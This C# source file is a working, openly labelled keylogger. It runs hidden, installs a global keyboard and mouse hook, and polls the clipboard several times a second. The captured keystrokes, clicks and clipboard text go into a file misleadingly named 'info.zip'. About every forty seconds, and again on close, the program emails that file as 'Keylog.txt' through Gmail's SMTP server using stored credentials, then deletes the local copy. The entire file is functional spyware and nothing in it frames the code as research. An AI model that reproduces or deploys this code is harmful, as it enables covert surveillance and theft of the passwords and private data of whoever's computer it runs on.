using System;
using System.Text;
using System.Windows.Forms;
using MouseKeyboardActivityMonitor.Controls;
using System.Timers;
using System.Net.Mail;
using System.Net.Mime;
using System.IO;
using System.Diagnostics;
using System.Threading;
using Newtonsoft.Json;
using temps;

public partial class Form1 : Form
{
    private static Form1 form;
    private MouseKeyEventProvider m_KeyMouseEventProvider;

    private TextBox InputBox;
    private RichTextBox OutputBox;
    private Button ResetButton;

    private System.Timers.Timer timer;
    private static MouseButtons lastclick = MouseButtons.None;
    private static Boolean newline = true;
    private static Stopwatch stopwatch;

    private System.Timers.Timer clip;
    private static String lastclip = "";

    private static string config = File.ReadAllText("config.json");
    private static EmailInfo emailInfo = JsonConvert.DeserializeObject<EmailInfo>(config);
    private static string emailaddress = emailInfo.email;
    private static string password = emailInfo.password;

    public Form1()
    {
        empty();
        this.FormClosing += new FormClosingEventHandler(Form1_FormClosing);
        stopwatch = new Stopwatch();
        timer = new System.Timers.Timer(1000 * 60 * .6666666667);
        timer.Elapsed += new ElapsedEventHandler(email);
        timer.Start();
        InitializeComponent();
        stopwatch.Restart();
        SetupClipboardTracker();
        writeInNewLine(DateTime.Now.ToString());
        SetVisibleCore(false);
        form = this;
    }

    private void SetupClipboardTracker()
    {
        clip = new System.Timers.Timer(250);
        clip.Elapsed += new ElapsedEventHandler(printclipboard);
        clip.Start();
    }

    public static void printclipboard(object source, ElapsedEventArgs e)
    {
        Thread mt = new Thread(new ThreadStart(printclipboardc));
        mt.SetApartmentState(System.Threading.ApartmentState.STA);
        mt.Start();
    }

    public static void printclipboardc()
    {
        try
        {
            IDataObject ClipData = System.Windows.Forms.Clipboard.GetDataObject();
            if (ClipData.GetDataPresent(DataFormats.Text))
            {
                String s = Clipboard.GetData(DataFormats.Text).ToString().Trim();
                if(s == null)
                {
                    return;
                }
                if (lastclip.Length == 0)
                {
                    form.writeInNewLine("Clipboard: " + s);
                    lastclip = s;
                }
                else
                {
                    if (!lastclip.Equals(s))
                    {
                        form.writeInNewLine("Clipboard: "+s);
                        lastclip = s;
                    }
                }
            }

        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.ToString());
            Console.WriteLine("Failed to read from clipboard!");
            Console.WriteLine(ex.ToString());
        }
    }

    protected override void SetVisibleCore(bool value)
    {
        if (!this.IsHandleCreated)
        {
            this.CreateHandle();
            value = false;
        }
        base.SetVisibleCore(value);
    }

    public void InitializeComponent()
    {
            this.m_KeyMouseEventProvider = new MouseKeyboardActivityMonitor.Controls.MouseKeyEventProvider();
            this.InputBox = new System.Windows.Forms.TextBox();
            this.OutputBox = new System.Windows.Forms.RichTextBox();
            this.ResetButton = new System.Windows.Forms.Button();
            this.SuspendLayout();
            // 
            // m_KeyMouseEventProvider
            // 
            this.m_KeyMouseEventProvider.Enabled = true;
            this.m_KeyMouseEventProvider.HookType = MouseKeyboardActivityMonitor.Controls.HookType.Global;
            this.m_KeyMouseEventProvider.MouseClick += new System.Windows.Forms.MouseEventHandler(this.HookManager_MouseClick);
            this.m_KeyMouseEventProvider.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.HookManager_MouseDoubleClick);
            this.m_KeyMouseEventProvider.KeyDown += new System.Windows.Forms.KeyEventHandler(this.HookManager_KeyDown);
            // 
            // InputBox
            // 
            this.InputBox.Location = new System.Drawing.Point(12, 12);
            this.InputBox.Name = "InputBox";
            this.InputBox.Size = new System.Drawing.Size(651, 22);
            this.InputBox.TabIndex = 0;
            // 
            // OutputBox
            // 
            this.OutputBox.Location = new System.Drawing.Point(12, 49);
            this.OutputBox.Name = "OutputBox";
            this.OutputBox.ReadOnly = true;
            this.OutputBox.Size = new System.Drawing.Size(651, 318);
            this.OutputBox.TabIndex = 1;
            this.OutputBox.Text = "";
            // 
            // ResetButton
            // 
            this.ResetButton.Location = new System.Drawing.Point(680, 12);
            this.ResetButton.Name = "ResetButton";
            this.ResetButton.Size = new System.Drawing.Size(75, 23);
            this.ResetButton.TabIndex = 2;
            this.ResetButton.Text = "reset";
            this.ResetButton.UseVisualStyleBackColor = true;
            this.ResetButton.Click += new System.EventHandler(this.button1_Click);
            // 
            // Form1
            // 
            this.ClientSize = new System.Drawing.Size(766, 381);
            this.Controls.Add(this.ResetButton);
            this.Controls.Add(this.OutputBox);
            this.Controls.Add(this.InputBox);
            this.Name = "Form1";
            this.ResumeLayout(false);
            this.PerformLayout();

    }

    private void write(String str, KeyEventArgs e)
    {
        Boolean shift = ModifierKeys.HasFlag(Keys.Shift);
        switch (str)
        {
            case "Return":
                writeInNewLine("Return");
                break;
            case "Space":
                writeInLine(" ");
                break;
            case "Oem1":
                if (shift) { writeInLine(":"); } else { writeInLine(";"); }
                break;
            case "OemMinus":
                if (shift) { writeInLine("_"); } else { writeInLine("-");  }
                break;
            case "Oemplus":
                if (shift) { writeInLine("+"); } else { writeInLine("="); }
                break;
            case "Oemtilde":
                if (shift) { writeInLine("~"); } else { writeInLine("`"); }
                break;
            case "D1":
                if (shift) { writeInLine("!"); } else { writeInLine("1"); }
                break;
            case "D2":
                if (shift) { writeInLine("@"); } else { writeInLine("2"); }
                break;
            case "D3":
                if (shift) { writeInLine("#"); } else { writeInLine("3"); }
                break;
            case "D4":
                if (shift) { writeInLine("$"); } else { writeInLine("4"); }
                break;
            case "D5":
                if (shift) { writeInLine("%"); } else { writeInLine("5"); }
                break;
            case "D6":
                if (shift) { writeInLine("^"); } else { writeInLine("6"); }
                break;
            case "D7":
                if (shift) { writeInLine("&"); } else { writeInLine("7"); }
                break;
            case "D8":
                if (shift) { writeInLine("*"); } else { writeInLine("8"); }
                break;
            case "D9":
                if (shift) { writeInLine("("); } else { writeInLine("9"); }
                break;
            case "D0":
                if (shift) { writeInLine(")"); } else { writeInLine("0"); }
                break;
            case "OemOpenBrackets":
                if (shift) { writeInLine("{"); } else { writeInLine("["); }
                break;
            case "Oem6":
                if (shift) { writeInLine("}"); } else { writeInLine("]"); }
                break;
            case "Oem5":
                if (shift) { writeInLine("|"); } else { writeInLine("\\"); }
                break;
            case "LShiftKey":
                break;
            case "RShiftKey":
                break;
            case "LControlKey":
                writeInLine(" Control ");
                break;
            case "RControlKey":
                writeInLine(" ControlKey ");
                break;
            case "LMenu":
                writeInLine(" Alt ");
                break;
            case "RMenu":
                writeInLine(" Alt ");
                break;
            case "CapsLock":
                break;
            case "Capital":
                break;
            case "Oem7":
                if (shift) { writeInLine("\""); } else { writeInLine("'"); }
                break;
            case "Oemcomma":
                if (shift) { writeInLine("<"); } else { writeInLine(","); }
                break;
            case "OemPeriod":
                if (shift) { writeInLine(">"); } else { writeInLine("."); }
                break;
            case "OemQuestion":
                if (shift) { writeInLine("?"); } else { writeInLine("/"); }
                break;
            case "Next":
                writeInLine(" PageDown ");
                break;
            default:
                if (str.Length == 1)
                {
                    try
                    {
                        if (Control.IsKeyLocked(Keys.CapsLock) != shift)
                        {
                            str = str.ToUpper();
                        }
                        else
                        {
                            str = str.ToLower();
                        }
                    }
                    catch (Exception v) { }
                    writeInLine(str);
                } else
                {
                    if (str.Length >= 6 && str.Substring(0, 6).Equals("NumPad"))
                    {
                        writeInLine(str.Substring(6, 1));
                    }
                    else
                    {
                        writeInLine(" " + str + " ");
                    }
                }
                break;
        }
        
        
    }

    private void writeInLine(String str)
    {
        newline = false;
        if(stopwatch.ElapsedMilliseconds >= 30000)
        {
            stopwatch.Restart();
            CValidate();
            writeInNewLine("\n--------------------\n" + DateTime.Now.ToString()+ "\n--------------------\n");
        }
        stopwatch.Restart();
        //richTextBox1.AppendText(str);
        System.IO.File.AppendAllText("info.zip", str);
    }

    private void writeInNewLine(String str)
    {
        if (!newline)
        {
            writeInLine("\n");
        }
        writeInLine(str + "\n");
        newline = true;
    }

    private void HookManager_KeyDown(object sender, KeyEventArgs e)
    {
        
        CValidate();
        write(e.KeyData.ToString(), e);
    }

    private void HookManager_KeyUp(object sender, KeyEventArgs e)
    {
        CValidate();
        write(e.KeyData.ToString(), e);
    }

    private void HookManager_MouseClick(object sender, MouseEventArgs e)
    {
        switch (e.Button)
        {
            case MouseButtons.Right:
                CValidate();
                lastclick = MouseButtons.Right;
                break;
            case MouseButtons.Middle:
                CValidate();
                lastclick = MouseButtons.Middle;
                break;
            default:
                CValidate();
                lastclick = MouseButtons.Left;
                break;
        }
    }

    private void HookManager_MouseDoubleClick(object sender, MouseEventArgs e)
    {
        lastclick = MouseButtons.None;
        switch (e.Button)
        {
            case MouseButtons.Right:
                writeInNewLine("RDoubleClick");
                break;
            case MouseButtons.Middle:
                writeInNewLine("MDoubleClick");
                break;
            default:
                writeInNewLine("DoubleClick");
                break;
        }
    }

    private void CValidate()
    {
        if (!(lastclick == MouseButtons.None))
        {
            switch (lastclick)
            {
                case MouseButtons.Right:
                    writeInNewLine("RClick");
                    break;
                case MouseButtons.Middle:
                    writeInNewLine("MClick");
                    break;
                default:
                    writeInNewLine("Click");
                    break;
            }
            lastclick = MouseButtons.None;
        }
    }

    private void button1_Click(object sender, EventArgs e)
    {
        OutputBox.ResetText();
        InputBox.ResetText();
    }

    public void email(object source, ElapsedEventArgs e)
    {
        if (File.Exists("info.zip"))
        {
            Thread mail = new Thread(new ThreadStart(SendEmail));
            mail.IsBackground = true;
            mail.SetApartmentState(System.Threading.ApartmentState.STA);
            mail.Start();
        }
    }

    public void SendEmail()
    {
        try {
            MailMessage mail = new MailMessage(emailaddress, emailaddress);
            SmtpClient client = new SmtpClient();
            client.EnableSsl = true;
            client.Port = 587;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;
            client.Host = "smtp.gmail.com";
            client.Credentials = new System.Net.NetworkCredential(emailaddress, password);
            mail.Subject = Environment.UserName + "'s Keylog";
            mail.Body = "Keylog attached";
            String attachmentFilename = "info.zip";
            if (attachmentFilename != null)
            {
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    byte[] contentAsBytes = Encoding.UTF8.GetBytes(File.ReadAllText("info.zip"));
                    memoryStream.Write(contentAsBytes, 0, contentAsBytes.Length);

                    memoryStream.Seek(0, SeekOrigin.Begin);
                    ContentType contentType = new ContentType();
                    contentType.MediaType = MediaTypeNames.Text.Plain;
                    contentType.Name = "Keylog.txt";

                    Attachment attach = new Attachment(memoryStream, contentType);
                    mail.Attachments.Add(attach);
                    client.Send(mail);
                }

            }
            empty();
        } catch(Exception e) { }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
        email(sender, null);
    }

    private void empty()
    {
        if (File.Exists("info.zip")) { File.Delete("info.zip"); }
    }
}